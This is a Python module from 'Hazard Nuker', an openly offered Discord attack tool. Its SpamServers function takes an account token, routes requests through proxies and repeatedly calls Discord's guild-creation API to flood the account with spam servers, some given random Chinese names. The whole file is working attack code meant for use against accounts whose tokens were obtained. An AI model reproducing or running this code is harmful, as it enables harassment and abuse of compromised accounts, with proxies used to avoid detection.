# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import requests

from colorama import Fore

from util.plugins.common import getheaders, proxy, RandomChinese

def SpamServers(token, icon, name=None):
    if name:
        for i in range(4):
            try:
                #Create all the servers named whatever you want
                payload = {'name': f'{name}', 'region': 'europe', 'icon': icon, 'channels': None}
                requests.post('https://discord.com/api/v7/guilds', proxies=proxy(), headers=getheaders(token), json=payload)
                print(f"{Fore.BLUE}Created {name}.{Fore.RESET}")
            except Exception as e:
                print(f"The following exception has been encountered and is being ignored: {e}")
    else:
        for i in range(4):
            server_name = RandomChinese(5,12)
            try:
                #Create all the servers named whatever you want
                payload = {'name': f'{server_name}', 'region': 'europe', 'icon': icon , 'channels': None}
                requests.post('https://discord.com/api/v7/guilds', proxies=proxy(), headers=getheaders(token), json=payload)
                print(f"{Fore.BLUE}Created {server_name}.{Fore.RESET}")
            except Exception as e:
                print(f"The following exception has been encountered and is being ignored: {e}")